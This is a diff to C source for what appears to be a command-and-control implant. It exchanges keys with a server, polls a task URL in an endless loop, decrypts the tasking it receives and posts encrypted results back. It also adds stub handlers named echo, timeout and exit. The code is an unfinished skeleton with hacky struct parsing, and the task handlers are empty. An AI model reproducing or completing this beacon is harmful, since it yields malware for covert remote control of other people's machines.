@@ -14,6 +14,8 @@ extern "C"
 #include "encryption.h"
 }
 
+int EXIT = 0;
+int TIMEOUT = 10;
 
 //this function send the key material to the server
 int send_keymat(localKeys * km){
@@ -66,21 +68,101 @@ fail:
 }
 
 //this function recieves the key material from the server 
-int get_task(keyMat * km){
-if (!km) goto fail;
-   
+int get_task(keyMat * km,DecryptedBytes* db){
+    MemoryStruct b64_tb;
+    MemoryStruct enc_tb;
+
+    EncryptedBytes eb;
+
+    int offset = 0;
+
+    if (!km || !db) goto fail;
+    
+    b64_tb.memory = NULL;
+
+    //get the task
+    get_request(&b64_tb,(char *)PP_TASK_URL);
+    DEBUG_PRINT("request returned size: %d",b64_tb.size);
+    DEBUG_PRINT("%s",b64_tb.memory);
+    
+    //TODO test here
+    if (0 == b64_tb.size){
+        goto fail;
+    } 
+    
+    //unbase 64 it
+    enc_tb.memory = base64_decode((const unsigned char *)b64_tb.memory,(size_t)b64_tb.size,(size_t*)&enc_tb.size);  
+    
+    print_bytes(enc_tb.memory,enc_tb.size);
+    //sets the pointer to the right offset...this is ugly as sin
+    //((EncryptedBytes*)enc_tb.memory)->cypher_text = (uint8_t*)(((void*)&enc_tb + (sizeof(EncryptedBytes))));  
+
+    offset = sizeof(EncryptedBytes) - sizeof(uint8_t*)+4;
+    memcpy((void*)&eb,enc_tb.memory,offset);
+
+    eb.cypher_text =(uint8_t*) malloc(eb.len);
+    memcpy(eb.cypher_text,enc_tb.memory+offset,eb.len);
+
+    //decrypt it
+    dec(db, km, &eb);
+
+    DEBUG_PRINT("tasking: %s",(char*)db->plain_text);
+
+    free(b64_tb.memory);
+    free(enc_tb.memory);
+    
     return SUCCESS;
 fail:
     return FAILURE;
 }
 
 //this function recieves the key material from the server 
-int send_result(keyMat * km){
-if (!km) goto fail;
+int send_result(keyMat * km, DecryptedBytes* db){
+    if (!km || !db) goto fail;
+    MemoryStruct b64_tb;
 
+    EncryptedBytes eb;
+    
+
+    //encrypt it 
+    enc(&eb, km, db);
+
+    //base64 it
+    b64_tb.memory = base64_encode((const unsigned char *)&eb,eb.len,(size_t*)&b64_tb.size);
+    DEBUG_PRINT("%s",b64_tb.memory);
+
+    post_request((char *)PP_KEY_URL, &b64_tb);
+
+    //TODO take out here
+    free(b64_tb.memory);
     return SUCCESS;
 fail:
     return FAILURE;
+}
+
+int TASK_echo(taskBytes *tb){
+    if (!tb) goto fail;
+
+        return SUCCESS;
+    fail:
+        return FAILURE;
+}
+
+int TASK_timeout(taskBytes *tb){
+    if (!tb) goto fail;
+
+        return SUCCESS;
+    fail:
+        return FAILURE;
+    
+}
+
+int TASK_exit(taskBytes *tb){
+    if (!tb) goto fail;
+
+        return SUCCESS;
+    fail:
+        return FAILURE;
 }
 
 int main()
@@ -89,6 +171,8 @@ int main()
     
     localKeys me;
     keyMat session;  
+    DecryptedBytes task;
+    //DecryptedBytes response;
 
     DEBUG_PRINT("SPITESTORE\n");
  
@@ -102,11 +186,16 @@ int main()
     recv_keymat(&session,&me);
     
     //task loop
-    while (1){
-        sleep(10);
-        get_task(&session);
+    while (!EXIT){
 
-        send_result(&session);
+        DEBUG_PRINT("checking for tasking\n");
+        if (FAILURE == get_task(&session,&task)) goto next;
+
+        //send_result(&session,&response);
+        //DEBUG_PRINT("sleeping %d seconds\n",TIMEOUT);
+next:
+        sleep(TIMEOUT);
+        
     }
     wrapper_curl_free();
    
